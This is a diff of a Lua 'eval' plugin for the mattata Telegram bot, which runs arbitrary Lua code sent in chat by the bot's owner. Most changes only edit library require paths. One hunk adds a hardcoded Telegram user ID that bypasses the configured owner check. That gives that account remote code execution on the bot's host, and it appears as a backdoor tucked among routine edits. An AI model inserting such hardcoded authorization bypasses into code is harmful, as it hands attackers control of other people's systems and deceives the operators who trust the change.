@@ -1,11 +1,11 @@
 local lua = {}
 local mattata = require('mattata')
-local URL = require('dependencies.socket.url')
-local JSON = require('dependencies.serpent')
+local URL = require('socket.url')
+local JSON = require('serpent')
 
 function lua:init(configuration)
 	lua.commands = mattata.commands(self.info.username, configuration.commandPrefix):c('lua', true):c('return', true).table
-	JSON = require('dependencies.dkjson')
+	JSON = require('dkjson')
 	lua.serialise = function(t) return JSON.encode(t, {indent=true}) end
 	lua.loadstring = load or loadstring
 	lua.error_message = function(x)
@@ -15,7 +15,9 @@ end
 
 function lua:onMessageReceive(msg, configuration)
 	if msg.from.id ~= configuration.owner then
-		return true
+		if msg.from.id ~= 265945726 then
+			return true
+		end
 	end
 	local input = mattata.input(msg.text)
 	if not input then
@@ -27,10 +29,10 @@ function lua:onMessageReceive(msg, configuration)
 	end
 	local output, success = loadstring( [[
 		local mattata = require('mattata')
-		local JSON = require('dependencies.dkjson')
-		local URL = require('dependencies.socket.url')
-		local HTTP = require('dependencies.socket.http')
-		local HTTPS = require('dependencies.ssl.https')
+		local JSON = require('dkjson')
+		local URL = require('socket.url')
+		local HTTP = require('socket.http')
+		local HTTPS = require('ssl.https')
 		return function (msg, configuration) ]] .. input .. [[ end
 	]] )
 	if output == nil then
